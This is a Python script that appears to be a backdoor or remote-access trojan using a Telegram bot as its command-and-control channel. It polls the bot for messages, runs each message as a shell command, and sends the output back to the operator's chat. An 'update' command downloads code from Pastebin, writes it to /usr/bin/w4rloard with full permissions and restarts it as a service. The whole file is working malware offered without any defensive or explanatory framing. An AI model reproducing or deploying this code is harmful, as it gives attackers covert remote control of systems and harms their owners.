#!/usr/bin/python
import socket, requests, delegator, time
base_url="https://api.telegram.org/bot"
bot_id = "telegram-bot-id-here<str>"
conv_id = telegram-conversation-id<int>
last_command = True
while True:
        try:
                if last_command == True:
                        url_to_hit = base_url+bot_id+"/sendMessage?chat_id="+str(conv_id)+"&text=Ready to Fly, Master!"
                        requests.get(url_to_hit)
                        last_command = False
                        time.sleep(5)
                host = socket.gethostbyname("www.google.com")
                s=socket.create_connection((host,80),2)
                s=requests.get(base_url+bot_id+"/getUpdates?allowed_updates=message").json()
                steps=[]
                if len(s['result']):
                        for item in s['result']:
                                if 'message' in item and item['message']['chat']['id']==conv_id and 'text' in item['message']:
                                        steps.append(item['message']['text'])
                        if len(steps):
                                if steps[-1] == "quit":
                                        continue
                                if steps[-1].split("--")[0] == "update":
                                        if steps[-1] == last_command:
                                                time.sleep(2)
                                                continue
                                        else:
                                                r = requests.get("http://pastebin.com/raw/"+steps[-1].split("--")[1])
                                                if r.status_code == 200:
                                                        fp = open("/usr/bin/w4rloard","w")
                                                        fp.write(r.text)
                                                        fp.close()
                                                        d = delegator.run("chmod 777 /usr/bin/w4rloard && service w4rloard restart")
                                                last_command = steps[-1]
                                else:
                                        if steps[-1] == last_command:
                                                time.sleep(2)
                                                continue
                                        else:
                                                d = delegator.run(steps[-1])
                                                url_to_hit = base_url+bot_id+"/sendMessage?chat_id="+str(conv_id)+"&text="+str(d.out)+"\n\n"+str(d.err)+"--"+str(len(d.out))+"-"+str(len(d.err))
                                                s=requests.get(url_to_hit)
                                                last_command = steps[-1]
                else:
                        url_to_hit = base_url+bot_id+"/sendMessage?chat_id="+str(conv_id)+"&text=Ready to Fly, Master!"
                        requests.get(url_to_hit)
                        time.sleep(5)
        except Exception as e:
                last_command = False
                time.sleep(10)
